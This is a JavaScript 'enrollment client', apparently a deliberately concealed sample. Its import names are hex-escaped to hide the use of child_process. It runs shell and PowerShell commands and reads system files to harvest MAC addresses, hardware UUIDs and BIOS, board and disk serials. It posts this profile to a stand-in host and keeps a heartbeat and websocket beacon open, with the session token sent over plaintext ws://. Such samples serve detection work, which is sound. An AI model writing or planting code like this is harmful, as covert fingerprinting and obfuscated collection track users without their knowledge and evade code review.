// Concealed enrollment variant: renamed identifiers, changed destination and
// route prefix, plaintext command strings with ASCII-escaped import
// specifiers. Collects stable hardware identifiers from macOS, Windows, and
// Linux sources, derives a device id, enrolls it, and keeps the session alive.
import axios from '\x61\x78\x69\x6f\x73';
import WebSocket from '\x77\x73';
import crypto from '\x63\x72\x79\x70\x74\x6f';
import os from '\x6f\x73';
import {exec as _exec} from '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73';
import {execSync} from '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73';
import {promisify} from '\x75\x74\x69\x6c';

const runCmd = promisify(_exec);

async function readStableIds() {
  const profile = {platform: os.platform(), arch: os.arch()};
  const macs = os.networkInterfaces();
  const seen = [];
  for (const addrs of Object.values(macs)) {
    for (const addr of addrs || []) {
      if (addr.mac && addr.mac !== '00:00:00:00:00:00' && !seen.includes(addr.mac)) {
        seen.push(addr.mac);
      }
    }
  }
  if (seen.length > 0) {
    profile.primaryMac = seen[0];
    profile.allMacs = seen.sort();
  }
  const jobs = [];
  jobs.push(runCmd('ioreg -rd1 -c IOPlatformExpertDevice').then((r) => {
    profile.systemUUID = r.stdout.trim();
  }).catch(() => {}));
  jobs.push(runCmd('sysctl -n hw.model').then((r) => {
    profile.model = r.stdout.trim();
  }).catch(() => {}));
  jobs.push(runCmd('system_profiler SPHardwareDataType').then((r) => {
    profile.hardware = r.stdout.trim();
  }).catch(() => {}));
  jobs.push(runCmd('powershell -NoProfile -NonInteractive -Command "Get-CimInstance Win32_ComputerSystemProduct | Select -ExpandProperty UUID"').then((r) => {
    profile.systemUUID = profile.systemUUID || r.stdout.trim();
  }).catch(() => {}));
  jobs.push(runCmd('powershell -NoProfile -NonInteractive -Command "Get-CimInstance Win32_BIOS | Select -ExpandProperty SerialNumber"').then((r) => {
    profile.biosSerial = r.stdout.trim();
  }).catch(() => {}));
  jobs.push(runCmd('powershell -NoProfile -NonInteractive -Command "Get-CimInstance Win32_OperatingSystem | Select -ExpandProperty Caption"').then((r) => {
    profile.osCaption = r.stdout.trim();
  }).catch(() => {}));
  await Promise.all(jobs);
  const fs = await import('fs/promises');
  for (const entry of [
    {path: '/etc/machine-id', field: 'machineId'},
    {path: '/sys/class/dmi/id/product_uuid', field: 'systemUUID'},
    {path: '/sys/class/dmi/id/product_serial', field: 'serialNumber'},
    {path: '/sys/class/dmi/id/product_name', field: 'productName'},
    {path: '/sys/class/dmi/id/board_serial', field: 'boardSerial'}
  ]) {
    try {
      const text = (await fs.readFile(entry.path, 'utf8')).trim();
      if (text && !profile[entry.field]) {
        profile[entry.field] = text;
      }
    } catch {}
  }
  try {
    const disk = execSync('lsblk -dno SERIAL /dev/sda').toString().trim();
    if (disk) {
      profile.diskSerial = disk;
    }
  } catch {}
  try {
    const smbios = execSync('dmidecode -s system-uuid').toString().trim();
    if (smbios && !profile.systemUUID) {
      profile.systemUUID = smbios;
    }
  } catch {}
  return profile;
}

function deriveDeviceId(profile) {
  const parts = [profile.systemUUID, profile.machineId, profile.serialNumber,
    profile.biosSerial, profile.boardSerial, profile.primaryMac].filter(Boolean);
  const fallback = [profile.cpuModel, profile.platform, profile.arch].filter(Boolean);
  const joined = (parts.length > 0 ? parts : fallback).join('|');
  return crypto.createHash('sha256').update(joined).digest('hex').slice(0, 32);
}

export class EnrollmentClient {
  constructor(options = {}) {
    this.baseURL = options.baseURL || 'https://enroll.example.invalid/api/v1';
    this.deviceId = null;
    this.sessionId = null;
    this.token = null;
    this.api = axios.create({baseURL: this.baseURL, timeout: 30000});
  }

  async enroll(label = '') {
    const profile = await readStableIds();
    const res = await this.api.post('/devices/register', {
      hardware_info: profile,
      app_version: '2.1.0',
      label
    });
    this.deviceId = res.data.device_id;
    this.sessionId = res.data.session_id;
    return res.data;
  }

  async signIn(username, password) {
    const res = await this.api.post('/auth/login', {username, password});
    this.token = res.data.access_token;
    return res.data;
  }

  async heartbeat() {
    const res = await this.api.post('/devices/heartbeat', {}, {
      headers: {'X-Session-ID': this.sessionId, 'X-Device-ID': this.deviceId}
    });
    return res.data;
  }

  startPulse(seconds = 30) {
    this.timer = setInterval(() => {
      this.heartbeat().catch(() => {});
    }, seconds * 1000);
  }

  linkSocket() {
    const url = 'ws://enroll.example.invalid/api/v1/ws/session?token=' + this.token
      + '&session_id=' + this.sessionId;
    this.ws = new WebSocket(url);
    this.ws.on('open', () => {
      this.ws.send(JSON.stringify({type: 'heartbeat', session_id: this.sessionId}));
    });
  }
}
